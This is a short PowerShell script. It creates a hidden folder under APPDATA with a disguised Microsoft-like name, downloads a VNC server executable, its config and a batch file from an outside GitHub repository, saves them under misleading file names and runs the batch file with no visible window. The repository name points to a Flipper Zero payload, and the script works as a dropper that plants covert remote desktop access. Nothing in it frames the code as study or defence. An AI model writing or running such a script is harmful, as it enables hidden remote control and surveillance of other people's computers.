# Define the hidden folder path
$hiddenFolderPath = "$env:APPDATA\Microsoft\inentor"

# Create the hidden folder
New-Item -ItemType Directory -Path $hiddenFolderPath -Force
Set-ItemProperty -Path $hiddenFolderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Define URLs for the files to download
$url1 = "https://github.com/TriPaGonski/VNCFLIPPERZERO/raw/main/winvnc.exe"
$url2 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/ultravnc.ini"
$url3 = "https://raw.githubusercontent.com/TriPaGonski/VNCFLIPPERZERO/main/Main.bat"

# Define the local file paths
$filePath1 = "$hiddenFolderPath\file1.bat"
$filePath2 = "$hiddenFolderPath\file2.bat"
$filePath3 = "$hiddenFolderPath\main.bat"

# Download the files
Invoke-WebRequest -Uri $url1 -OutFile $filePath1
Invoke-WebRequest -Uri $url2 -OutFile $filePath2
Invoke-WebRequest -Uri $url3 -OutFile $filePath3

# Execute the main.bat file
Start-Process -FilePath $filePath3 -NoNewWindow
